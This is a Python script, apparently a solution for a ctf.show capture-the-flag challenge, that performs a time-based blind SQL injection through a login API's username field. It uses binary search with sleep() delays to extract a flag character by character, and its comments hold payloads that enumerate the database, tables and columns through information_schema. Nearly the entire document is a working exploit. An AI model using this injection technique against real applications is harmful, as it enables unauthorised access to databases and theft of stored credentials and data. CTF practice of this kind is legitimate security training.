# @Author:Kradress
import requests

# import time

url = "http://9efc11b4-4775-4c6b-babb-5b027cf7e4ed.challenge.ctf.show/api/"
table_name = 'flag23a'
flag = 'flagass23s3'

result = ''


def strToHex(S: str):
    parts = []
    for s in S:
        parts.append(str(hex(ord(s)))[2:])
    return '0x' + ''.join(parts)


# 数据库名
# payload = "database()"
# 爆表名
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆列名
# payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name={strToHex(table_name)}"
# 爆字段值
payload = f"select {flag} from {table_name}"

for i in range(1, 50):
    head = 32
    tail = 127

    while head < tail:

        # time.sleep(1)
        mid = (head + tail) >> 1  # 中间指针等于头尾指针相加的一半
        # print(mid)
        data = {
            'username': f" where username =  0x63746673686f77 and if(ascii(substr(({payload}),{i},1))>{mid},sleep(3),1)#",
            'password': "\\"
        }
        try:
            r = requests.post(url, data, timeout=2.5)
            tail = mid
        except:
            head = mid + 1  # sleep导致超时

    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
